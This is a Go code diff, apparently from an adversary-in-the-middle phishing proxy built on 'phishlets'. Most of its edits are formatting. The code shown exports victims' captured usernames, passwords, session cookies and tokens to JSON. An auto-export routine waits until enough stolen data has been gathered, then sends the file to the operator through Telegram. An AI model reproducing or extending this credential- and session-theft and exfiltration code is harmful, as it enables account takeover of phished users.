@@ -13,21 +13,21 @@ import (
 
 // SessionExport represents the exported session data
 type SessionExport struct {
-	SessionInfo SessionInfo              `json:"session_info"`
-	Credentials Credentials              `json:"credentials"`
-	Tokens      TokenData                `json:"tokens"`
-	Cookies     []ExportedCookie         `json:"cookies"`
-	Metadata    map[string]string        `json:"metadata,omitempty"`
+	SessionInfo SessionInfo       `json:"session_info"`
+	Credentials Credentials       `json:"credentials"`
+	Tokens      TokenData         `json:"tokens"`
+	Cookies     []ExportedCookie  `json:"cookies"`
+	Metadata    map[string]string `json:"metadata,omitempty"`
 }
 
 type SessionInfo struct {
-	ID          int       `json:"id"`
-	Phishlet    string    `json:"phishlet"`
-	LandingURL  string    `json:"landing_url"`
-	UserAgent   string    `json:"user_agent"`
-	RemoteIP    string    `json:"remote_ip"`
-	CreateTime  string    `json:"create_time"`
-	UpdateTime  string    `json:"update_time"`
+	ID         int    `json:"id"`
+	Phishlet   string `json:"phishlet"`
+	LandingURL string `json:"landing_url"`
+	UserAgent  string `json:"user_agent"`
+	RemoteIP   string `json:"remote_ip"`
+	CreateTime string `json:"create_time"`
+	UpdateTime string `json:"update_time"`
 }
 
 type Credentials struct {
@@ -86,7 +86,6 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 			BodyTokens:   session.BodyTokens,
 			HttpTokens:   session.HttpTokens,
 		},
-
 	}
 
 	// Convert cookie tokens to exportable format
@@ -105,11 +104,11 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 				Secure:         token.Secure, // Use actual secure value from cookie
 				Session:        false,
 			}
-			
+
 			if cookie.Path == "" {
 				cookie.Path = "/"
 			}
-			
+
 			cookies = append(cookies, cookie)
 		}
 	}
@@ -121,10 +120,10 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 	for _, cookie := range export.Cookies {
 		log.Debug("[telegram_export] Cookie %s secure=%v", cookie.Name, cookie.Secure)
 	}
-	
+
 	// Generate cookies JSON array only
 	cookiesOnlyJSON, _ := json.Marshal(export.Cookies)
-	
+
 	// Write to file in the specific format requested
 	file, err := os.Create(filename)
 	if err != nil {
@@ -178,15 +177,15 @@ func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
 	hasCredentials := session.Username != "" && session.Password != ""
 	hasCookies := len(session.CookieTokens) > 0
 	hasOtherTokens := len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0
-	
+
 	// Export if:
 	// 1. Session is marked as done (all auth tokens captured)
 	// 2. We have credentials AND cookies
 	// 3. We have all token types
 	shouldExport := session.IsDone || (hasCredentials && hasCookies) || (hasCookies && hasOtherTokens)
-	
+
 	if !shouldExport {
-		log.Debug("[%d] waiting for more data before export (creds:%v, cookies:%v, done:%v)", 
+		log.Debug("[%d] waiting for more data before export (creds:%v, cookies:%v, done:%v)",
 			sessionID, hasCredentials, hasCookies, session.IsDone)
 		return
 	}
@@ -217,7 +216,7 @@ func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
 	go func() {
 		// Small delay to ensure the message arrives before the file
 		time.Sleep(500 * time.Millisecond)
-		
+
 		if err := p.telegram.SendDocument(filename, ""); err != nil {
 			log.Error("failed to send session export via telegram: %v", err)
 		} else {
